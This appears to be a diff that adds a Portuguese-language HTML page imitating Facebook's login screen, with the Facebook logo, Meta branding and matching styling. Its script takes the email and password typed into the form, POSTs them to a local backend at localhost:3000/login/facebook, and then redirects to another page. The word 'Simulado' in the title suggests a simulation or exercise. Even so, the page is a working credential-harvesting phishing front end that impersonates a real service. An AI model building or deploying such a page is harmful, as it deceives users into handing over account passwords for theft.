@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Facebook - Simulado</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: white;
+      width: 100%;
+      max-width: 360px;
+      padding: 24px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 50px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+    }
+
+    input:focus {
+      border-color: #1877f2;
+      outline: none;
+    }
+
+    .btn-login {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+
+    .btn-login:hover {
+      background-color: #166fe5;
+    }
+
+    .link {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .link a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .divider {
+      height: 1px;
+      background-color: #dadde1;
+      margin: 20px 0;
+    }
+
+    .btn-create {
+      width: 100%;
+      background-color: #42b72a;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .btn-create:hover {
+      background-color: #36a420;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      margin-top: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" />
+    </div>
+
+    <form id="login-form">
+      <input type="text" id="email" placeholder="E-mail ou número de telefone" required>
+      <input type="password" id="password" placeholder="Senha" required autocomplete="current-password">
+      <button type="submit" class="btn-login" id="loginButton" disabled>Entrar</button>
+    </form>
+    
+    <div class="link">
+      <a href="#">Esqueceu a senha?</a>
+    </div>
+
+    <div class="divider"></div>
+
+    <button class="btn-create">Criar nova conta</button>
+
+    <div class="footer">
+      Meta © 2025
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('login-form');
+      const btn = document.getElementById('loginButton');
+      const inputs = [document.getElementById('email'), document.getElementById('password')];
+    
+      inputs.forEach(input => {
+        input.addEventListener('input', () => {
+          btn.disabled = inputs.some(i => !i.value.trim());
+        });
+      });
+    
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+    
+        try {
+          const response = await fetch('http://localhost:3000/login/facebook', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+          });
+    
+          const data = await response.json();
+          if (!response.ok) {
+            throw new Error(data.error || 'Erro ao efetuar login.');
+          }
+    
+          // ─── AQUI: redireciona para pesquisas.html ─────────────────────────────
+          window.location.href = 'pesquisas.html';
+    
+        } catch (err) {
+          console.error(err);
+          alert(err.message);
+        }
+      });
+    });
+    </script>
+    
+</body>
+</html>
